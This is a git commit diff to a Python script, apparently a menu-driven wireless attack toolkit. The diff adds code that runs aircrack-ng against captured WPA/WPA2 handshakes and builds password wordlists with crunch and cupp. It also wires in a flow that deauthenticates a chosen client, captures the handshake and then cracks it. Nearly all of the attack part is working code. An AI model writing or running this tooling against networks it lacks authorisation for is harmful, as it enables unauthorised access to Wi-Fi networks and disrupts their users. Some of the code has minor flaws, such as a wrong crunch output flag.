f93a423f33df87b0ed5b53c6a21cd7afe79c05f8
Shu-Hao Liu <aidan.park888@proton.me>
2025-01-05 16:06:05 -0600

    Update tool.py

--- tool.py
+++ tool.py
@@ -1,6 +1,69 @@
 import subprocess
 from scapy.all import *
 import argparse
+import time
+def crackWifi(cap_file, wordlist): # crack Wifi password for WPA/WPA2 networks
+    command = [
+        'sudo','aircrack-ng',cap_file,'-w',wordlist
+    ]
+
+    try:
+        
+        subprocess.run(command, shell=True, check=True)
+    except subprocess.CalledProcessError as e:
+        
+        print(f"Error: {e}")
+#-------Wordlist--------
+def crunch(min_chars, max_chars, characters, pattern, filename): # use crunch tool
+    command = [
+        'sudo', 'crunch', str(min_chars), str(max_chars), characters,
+        '-t', pattern, '-i', filename
+    ]
+
+  
+    try:
+        result = subprocess.run(command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        print(result.stdout.decode())
+    except subprocess.CalledProcessError as e:
+        print("Error occurred:",e.stderr.decode())
+
+
+
+
+def cupp(): # use cupp tool
+    try:
+        subprocess.run(['sudo', 'cupp', '-i'])
+    except FileNotFoundError:
+        print("Error: The 'cupp' tool is not installed or not found in the system's PATH.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+#-----------------------        
+def wordlist():
+    while True:
+        print('''
+    1. Create a wordlist using Cupp (beginner friendly)
+    2. Create a wordlist using Crunch
+    BACK. Back to main menu
+    
+''')
+        wordlistChoice=input('Select an option: ')
+        if wordlistChoice=='1':
+            cupp()
+        elif wordlistChoice=='2':
+            min_chars=input('Enter the minimum characters for the words generated: ')
+            max_chars=input('Enter the maximum characters for the words generated: ')
+            characters=input('Enter the characters that you would like to use (e.g. ABCD123 to include only A,B,C,D,1,2,3): ')
+            pattern=input("Enter the pattern that you would like the words to have (e.g. a@@@b to generate words that starts with 'a' and ends with 'b' and contains a total of 5 characters): ")
+            wordlist_file=input('Enter the name of the file you would like to save the wordlist to: ')
+            crunch(min_chars,max_chars,characters,pattern,wordlist_file)
+        elif wordlistChoice=='BACK':
+            main()
+        else:
+            print('Invalid option')
+            
+            
+            
+#------Wireless Attacks-----------
 def captureHandshake(bssid, channel, filename, interface): # capture a four-way handshake
     
     
@@ -122,6 +185,8 @@ def wirelessAttack(): # selection of options for wireless attacks
     7. Capture WPA/WPA2 handshake
     8. Crack WPA/WPA2 with wordlist
     BACK. Back to main menu
+
+    Note: Support for WEP cracking and WPS pin cracking will be added in the future. 
     ''')
         WAchoice=input('Select an option: ')
         if WAchoice=='1':
@@ -185,13 +250,37 @@ def wirelessAttack(): # selection of options for wireless attacks
             if ifDeauth=='y':
                 deauth_packets=input('How many deauth packets would you like to send? ')
                 bssid=input('Enter the BSSID of the network: ')
+                channel=input('Enter the channel # of the network: ')
+                filename2=input('Enter the file name to save the captured results to: ')
                 clientMac=input('Enter the MAC address of the host you would like to disconnect from the network: ')
                 interface=monMode
                 deauthenticate(deauth_packets,bssid,clientMac,interface)
+                captureHandshake(bssid,channel,filename2,interface)
+            elif ifDeauth=='n':
+                bssid=input('Enter the BSSID of the network: ')
+                channel=input('Enter the channel # of the network: ')
+                filename2=input('Enter the file name to save the captured results to: ')
+                interface=monMode
+                captureHandshake(bssid,channel,filename2,interface)
+        elif WAchoice=='8':
+            monMode = get_monitor_mode_interface()
+            print('Generate a wordlist first with option 6 on the main menu\n')
+            createWordlist=input('Did you create the wordlist to use [y/n]? ')
+            if createWordlist=='y':
+                cap_file=input('Enter the name of the .cap file with the four-way handshake: ')
+                wordlistName=input('Enter the name of the wordlist: ')
+                crackWifi(cap_file,wordlistName)
+            elif createWordlist=='n':
+                print('Taking you to the wordlist generator. Come back when you are done.')
+                time.sleep(2)
+                wordlist()
+            else:
+                print('Invalid option')
+            
                 
             
-        
-#---------------------------------------
+#-------------------------------------        
+#-------------Main--------------------
 print('''
 
 #######################################
